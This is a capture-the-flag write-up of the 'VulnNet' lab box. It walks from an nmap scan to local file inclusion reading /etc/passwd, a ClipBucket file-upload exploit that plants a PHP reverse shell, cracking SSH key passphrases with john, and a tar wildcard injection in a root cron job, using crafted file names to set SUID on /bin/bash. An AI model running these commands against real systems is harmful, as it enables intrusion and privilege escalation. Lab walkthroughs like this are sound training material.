##VulnNet

#Enumeration
add vulnnet.thm to /etc/hosts
```
# Nmap 7.91 scan initiated Sun Apr 25 10:52:39 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80 10.10.238.178
Nmap scan report for vulnnet.thm (10.10.238.178)
Host is up, received timestamp-reply ttl 61 (0.15s latency).
Scanned at 2021-04-25 10:52:40 PDT for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
|   256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 25 10:52:52 2021 -- 1 IP address (1 host up) scanned in 13.20 seconds
```
Pretty simple configuration so far so lets just check out the web server

#Web Server Port 80
Nothing stands out initially so ultimately we check out the js scripts on the page and ultimately find the following code
"http://vulnnet.thm/index.php?referer="
so looks like we have a paramter we can test for LFI,
curl http://vulnnet.thm/index.php?referer=/etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
```
Sure enough we have LFI as referer is acting as a get request so we have a server-management user on the system, so we can check common files for credentials.
We eventually find credentials for the webserver in /etc/apache2/.htpasswd

However it seems like the credentials aren't applicable here. Eventually we do enumeration for subdomains and find one broadcast.vulnnet.thm that requires credentials and we gain access.

#broadcast.vulnnet.thm
<!-- ClipBucket version 4.0 -->
we find the version of the application and can look up and existing exploits
```
2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"
```
seems like we can start by trying to upload a reverse shell and gain a foothold, so we can form the following curl request

curl -u developers:REDACTED -F "file=@revshell.php" -F "plupload=1" -F "name=revshell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"

sure enough we get a revshell and foothold as the www-data user

#Privilege Escalation
On the system we check the usual spots and can find backupcredentials in /var/backups that are owned by the server-management user and we can download to our system and view we find ssh credentials
we go ahead and use ssh2john and then crack the password using john and can then ssh as the server-mangement user and find the user flag in our home directory

#Root Escalation
We can't access sudo commands with the same crednetials so we check cronjobs, and see the following line
```
*/2   * * * *   root    /var/opt/backupsrv.sh
```
```
server-management@vulnnet:~$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup.
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```
Looks like this binary uses tar to make a backup of our Documents folder.
There is a way to abuse this to get the binary to get the tar command to achieve code execution for us so we will have it give suid permission to /bin/bash and then spawn a privileged shell that way as follow
```
server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh test.sh"
server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
server-management@vulnnet:~/Documents$ echo "chmod +s /bin/bash" > test.sh
```
The command we execute can be different such as sending a reverse shell to a listener, etc
We can then spawn a roots shell with 
/bin/bash -p
and then find the root flag in the root directory
